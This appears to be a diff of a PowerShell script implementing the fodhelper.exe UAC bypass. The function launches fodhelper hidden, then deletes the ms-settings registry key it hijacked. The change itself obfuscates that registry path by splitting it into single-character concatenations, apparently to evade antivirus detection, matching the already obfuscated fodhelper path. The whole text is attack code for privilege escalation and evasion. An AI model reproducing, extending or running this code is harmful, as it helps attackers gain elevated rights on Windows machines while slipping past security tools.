@@ -12,7 +12,8 @@ function c4ff45bb1fab99f9164b7fec14b2292a {
 	$valid = "C"+":"+"\"+"W"+"i"+"n"+"d"+"o"+"w"+"s"+"\"+"S"+"y"+"s"+"t"+"e"+"m"+"3"+"2"+"\"+"f"+"o"+"d"+"h"+"e"+"l"+"p"+"e"+"r"+"."+"e"+"x"+"e"
     Start-Process $valid -WindowStyle Hidden
 	Start-Sleep -s 3
-    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+	$item = "H"+"K"+"C"+"U"+":"+"\"+"S"+"o"+"f"+"t"+"w"+"a"+"r"+"e"+"\"+"C"+"l"+"a"+"s"+"s"+"e"+"s"+"\"+"m"+"s"+"-"+"s"+"e"+"t"+"t"+"i"+"n"+"g"+"s"+"\"
+    Remove-Item $item -Recurse -Force -ErrorAction SilentlyContinue
 }
 
 b1946ac92492d2347c6235b4d2611184
